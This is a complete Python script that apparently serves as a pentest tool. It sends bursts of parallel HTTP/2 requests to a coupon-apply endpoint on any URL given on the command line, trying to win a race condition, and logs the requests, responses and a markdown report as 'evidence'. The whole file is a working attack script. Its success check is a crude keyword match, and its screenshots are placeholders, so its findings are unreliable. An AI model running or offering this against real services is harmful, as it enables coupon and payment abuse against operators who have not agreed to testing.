#!/usr/bin/env python3
"""
Race Condition Exploiter with Evidence Collection
Creates organized folder structure for vulnerability evidence
"""

import os
import sys
import time
import json
import httpx
import asyncio
from datetime import datetime

class VulnerabilityEvidence:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.evidence_dir = self._create_evidence_directory()
        self.session_file = os.path.join(self.evidence_dir, "logs", "session_log.txt")
        self._init_session_log()
        
    def _create_evidence_directory(self):
        base_dir = "vulnerability_evidence"
        os.makedirs(base_dir, exist_ok=True)

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        target_name = self.target_url.split('//')[-1].split('/')[0].replace('.', '_')
        evidence_dir = os.path.join(base_dir, f"{target_name}_{timestamp}")
        
        for subdir in ['requests', 'responses', 'screenshots', 'logs']:
            os.makedirs(os.path.join(evidence_dir, subdir), exist_ok=True)
        return evidence_dir
    
    def _init_session_log(self):
        with open(self.session_file, 'w') as f:
            f.write(f"Race Condition Test Session - {datetime.now()}\n")
            f.write(f"Target URL: {self.target_url}\n\n")
    
    def log_activity(self, message):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(self.session_file, 'a') as f:
            f.write(f"[{timestamp}] {message}\n")
    
    def save_request(self, request_data, filename):
        path = os.path.join(self.evidence_dir, 'requests', filename)
        with open(path, 'w') as f:
            f.write(request_data)
        self.log_activity(f"Saved request to {filename}")
    
    def save_response(self, response_data, filename):
        path = os.path.join(self.evidence_dir, 'responses', filename)
        try:
            if isinstance(response_data, httpx.Response):
                data = {
                    'status': response_data.status_code,
                    'headers': dict(response_data.headers),
                    'body': response_data.text
                }
                with open(path, 'w') as f:
                    json.dump(data, f, indent=2)
            else:
                with open(path, 'w') as f:
                    f.write(str(response_data))
            self.log_activity(f"Saved response to {filename}")
        except Exception as e:
            self.log_activity(f"Failed to save response {filename}: {e}")
    
    def save_screenshot(self, filename):
        path = os.path.join(self.evidence_dir, 'screenshots', filename)
        with open(path, 'wb') as f:
            f.write(b"Screenshot placeholder")
        self.log_activity(f"Saved screenshot to {filename}")

class RaceConditionExploiter(VulnerabilityEvidence):
    def __init__(self, target_url, debug=False):
        super().__init__(target_url)
        self.debug = debug
        self.client = None
        self.log_activity("Initialized RaceConditionExploiter")
        
    async def __aenter__(self):
        self.client = httpx.AsyncClient(http2=True)
        return self
        
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        await self.client.aclose()
        self.log_activity("Closed Async HTTP Client")
    
    async def execute_attack(self, request_template, count=20):
        self.log_activity(f"Launching attack with {count} requests")
        
        requests = self._generate_requests(request_template, count)
        for i, req in enumerate(requests):
            self.save_request(req, f"request_{i}.txt")
        
        responses = await self._send_parallel_requests(requests)
        
        vulnerable = False
        for i, resp in enumerate(responses):
            self.save_response(resp, f"response_{i}.json")
            if self._is_vulnerable_response(resp):
                vulnerable = True
                self.log_activity(f"Vulnerability detected in response {i}")
        
        self._generate_report(vulnerable)
        return vulnerable
    
    def _generate_requests(self, template, count):
        return [
            template.replace("REQUEST_ID", str(i)).replace("TIMESTAMP", str(int(time.time())))
            for i in range(count)
        ]
    
    def _parse_request(self, raw_request):
        lines = raw_request.splitlines()
        if not lines:
            return 'GET', self.target_url, {}, ""

        method, path, *_ = lines[0].split()
        headers = {}
        body_lines = []
        parsing_body = False

        for line in lines[1:]:
            if line.strip() == "":
                parsing_body = True
                continue
            if parsing_body:
                body_lines.append(line)
            else:
                if ':' in line:
                    key, val = line.split(':', 1)
                    headers[key.strip()] = val.strip()

        url = path if path.startswith("http") else f"{self.target_url}/{path.lstrip('/')}"
        return method, url, headers, "\n".join(body_lines)
    
    async def _send_parallel_requests(self, requests):
        tasks = []
        for i, req in enumerate(requests):
            method, url, headers, body = self._parse_request(req)
            tasks.append(self._send_request(method, url, headers, body, i))
        return await asyncio.gather(*tasks, return_exceptions=True)
    
    async def _send_request(self, method, url, headers, body, request_id):
        try:
            method = method.upper()
            response = None
            if method == 'GET':
                response = await self.client.get(url, headers=headers)
            elif method == 'POST':
                response = await self.client.post(url, headers=headers, content=body)
            elif method == 'PUT':
                response = await self.client.put(url, headers=headers, content=body)
            else:
                raise ValueError(f"Unsupported HTTP method: {method}")

            if self.debug:
                print(f"Request {request_id}: {response.status_code}")
            return response
        except Exception as e:
            self.log_activity(f"Request {request_id} failed: {e}")
            return e

    def _is_vulnerable_response(self, response):
        if isinstance(response, Exception):
            return False
        if response.status_code == 200:
            return any(keyword in response.text.lower() for keyword in ['success', 'applied', 'accepted'])
        return False
    
    def _generate_report(self, vulnerable):
        path = os.path.join(self.evidence_dir, "vulnerability_report.md")
        with open(path, 'w') as f:
            f.write("# Race Condition Vulnerability Report\n\n")
            f.write(f"**Target**: {self.target_url}\n")
            f.write(f"**Date**: {datetime.now()}\n")
            f.write(f"**Vulnerability Found**: {'YES' if vulnerable else 'NO'}\n\n")
            f.write("## Requests and Responses\n")
            f.write(f"- Requests: {len(os.listdir(os.path.join(self.evidence_dir, 'requests')))}\n")
            f.write(f"- Responses: {len(os.listdir(os.path.join(self.evidence_dir, 'responses')))}\n\n")

            if vulnerable:
                f.write("## Vulnerability Evidence\n")
                f.write("- Race condition detected based on response indicators.\n")
            f.write("\n## Reproduction Steps\n")
            f.write("1. Send multiple identical requests in parallel.\n")
            f.write("2. Analyze responses for success indicators.\n")
        
        self.log_activity(f"Report generated at {path}")

async def main():
    if len(sys.argv) < 2:
        print("Usage: python3 race_exploit.py <target_url> [request_count]")
        sys.exit(1)

    target_url = sys.argv[1]
    count = int(sys.argv[2]) if len(sys.argv) > 2 else 20

    host = target_url.split('//')[-1].split('/')[0]

    request_template = f"""POST /api/coupon/apply HTTP/2
Host: {host}
Cookie: session=session_{{REQUEST_ID}}
Content-Type: application/json
X-Request-ID: {{TIMESTAMP}}

{{"code":"TESTCOUPON"}}"""

    async with RaceConditionExploiter(target_url, debug=True) as exploiter:
        vulnerable = await exploiter.execute_attack(request_template, count)
        print(f"\n[+] Vulnerability found: {vulnerable}")
        print(f"[+] Evidence saved in: {exploiter.evidence_dir}")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
